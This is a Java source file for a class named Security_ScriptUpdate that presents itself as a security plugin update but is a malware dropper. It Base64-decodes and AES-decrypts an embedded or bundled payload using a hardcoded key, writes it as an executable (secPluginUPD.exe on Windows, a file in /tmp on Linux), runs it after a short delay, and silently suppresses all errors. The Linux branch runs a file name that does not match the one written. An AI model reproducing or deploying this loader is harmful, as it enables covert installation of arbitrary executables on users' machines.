import java.io.*;
import java.util.concurrent.TimeUnit;
import java.security.SecureRandom;
import javax.crypto.spec.SecretKeySpec;
import javax.crypto.Cipher;
import java.util.Base64;
import java.util.Properties;
 
public class Security_ScriptUpdate {
  public Security_ScriptUpdate() {
    try {
        String arch = System.getProperty("os.arch");
        String osName = System.getProperty("os.name");
        String outPath = null;
        String payload = null;
        String linPayload = "Base64 ENCODED PAYLOAD";
        if (osName.contains("Windows")) {
            outPath = "secPluginUPD.exe";
            InputStream inStream = Security_ScriptUpdate.class.getClassLoader().getResourceAsStream("winmsgAES64.txt");
            InputStreamReader isReader = new InputStreamReader(inStream);
            BufferedReader reader = new BufferedReader(isReader);
            StringBuilder sb = new StringBuilder();
            String content;
            while((content = reader.readLine()) != null) {
                sb.append(content);
            }
            String winPayload = sb.toString();
            getBytes(winPayload,outPath);
            String cDir = System.getProperty("user.dir");
            String winCmds = outPath;
            TimeUnit.SECONDS.sleep(5);
            java.lang.Runtime.getRuntime().exec(winCmds);
        }
        else if (osName.contains("Linux")) {
            String[] linCmds = new String[3];
            outPath = "/tmp/secPluginUpd";
            payload = "chmod +x " + outPath + " && cd /tmp && ./pluginUpd";
            linCmds[0] = "bash";
            linCmds[1] = "-c";
            linCmds[2] = payload;
            getBytes(linPayload,outPath);
            TimeUnit.SECONDS.sleep(5);
            java.lang.Runtime.getRuntime().exec(linCmds);
        }
    }catch (Exception e) {
        //System.out.println(e);
     }
  }
  public static void getBytes(String website, String outPath) {
            byte[] decoded = Base64.getDecoder().decode(website);
            try {
                FileOutputStream w = new FileOutputStream(outPath);
                w.write(decryptFile(decoded));
                w.close();
                //baos.close();
            } catch (IOException e) {
                //System.out.println(e);
            }
    }
  public static byte[] decryptFile(byte[] encBytes) {
        byte[] decBytes = null;
        try {
            String plainKey = "gb packers rule!";
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            SecretKeySpec key = new SecretKeySpec(plainKey.getBytes(), "AES");
            cipher.init(Cipher.DECRYPT_MODE, key);
            decBytes = cipher.doFinal(encBytes);

        } catch(Exception e) {      
            //System.out.println(e);
        }
        return decBytes;
    }
}